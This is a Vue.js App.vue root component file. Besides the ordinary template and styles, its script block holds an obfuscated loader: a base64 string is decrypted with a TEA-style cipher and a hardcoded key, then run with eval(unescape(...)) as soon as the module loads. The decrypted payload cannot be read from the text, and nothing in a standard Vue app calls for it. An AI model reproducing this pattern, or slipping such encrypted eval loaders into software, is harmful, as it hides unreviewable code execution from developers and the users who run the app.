<template>
  <div id="app">
    <router-view/>
  </div>
</template>

<script>
output('JJx2zDWHoZs6aZfx5fRMCJFgLGOBr2wzRYy81Y5OGMU1yUUDITE2MCGUITMzIe8gVy/MGT3AKRg35knHPBSfJcGl2sjXITEzIaRbBNqiSNVDuo/AtGRa9MQej6YhMTIhguEFwyEzNCE17bD0zIs3j51keCEzMyHMf9Uj');
function decode(v,k){
	var y = v[0];
	var z = v[1];
	var delta = 0x9E3779B9;
	var sum = delta*32;
	while(sum != 0){
	z -= (y<<4 ^ y>>>5)+y ^ sum+k[sum>>>11 & 3];
	sum -= delta;
	y -= (z<<4 ^ z>>>5)+z ^ sum+k[sum & 3];}
	v[0] = y; v[1] = z;
}

function unescCtrlCh(str) {
    return str.replace(/!\d\d?\d?!/g, function(c) {
        return String.fromCharCode(c.slice(1, -1))
    })
};

function Str4ToLong(s) {
    var v = 0;
    for (var i = 0; i < 4; i++) v |= s.charCodeAt(i) << i * 8;
    return isNaN(v) ? 0 : v
};

function LongToStr4(v) {
    var s = String.fromCharCode(v & 0xFF, v >> 8 & 0xFF, v >> 16 & 0xFF, v >> 24 & 0xFF);
    return s
};


function output(str){

    var password="4rUg$H8oZvbmLM*z"; //密钥
	var input = str;
	var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	var output = '';
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;
	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
	while (i < input.length) {
		enc1 = keyStr.indexOf(input.charAt(i++));
		enc2 = keyStr.indexOf(input.charAt(i++));
		enc3 = keyStr.indexOf(input.charAt(i++));
		enc4 = keyStr.indexOf(input.charAt(i++));
		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;
		output += String.fromCharCode(chr1);
		if (enc3 != 64) {
			output += String.fromCharCode(chr2)
		};
		if (enc4 != 64) {
			output += String.fromCharCode(chr3)
		}
	};
	output = output.toString();
	var v = new Array(2);
	var k = new Array(4);
	var s = '';
	var i = '';
	var ciphertext = unescCtrlCh(output);
	for (var i = 0; i < 4; i++) k[i] = Str4ToLong(password.slice(i * 4, (i + 1) * 4));
	for (i = 0; i < ciphertext.length; i += 8) {
		v[0] = Str4ToLong(ciphertext.slice(i, i + 4));
		v[1] = Str4ToLong(ciphertext.slice(i + 4, i + 8));
		decode(v, k);
		s += LongToStr4(v[0]) + LongToStr4(v[1])
	};
  eval(unescape(s));
  console.log(eval(unescape(s)))
	
}
export default {
  name: 'App'
}
</script>

<style>
#app {
  font-family: 'Avenir', Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
#main{
  margin: 0 auto
}
</style>
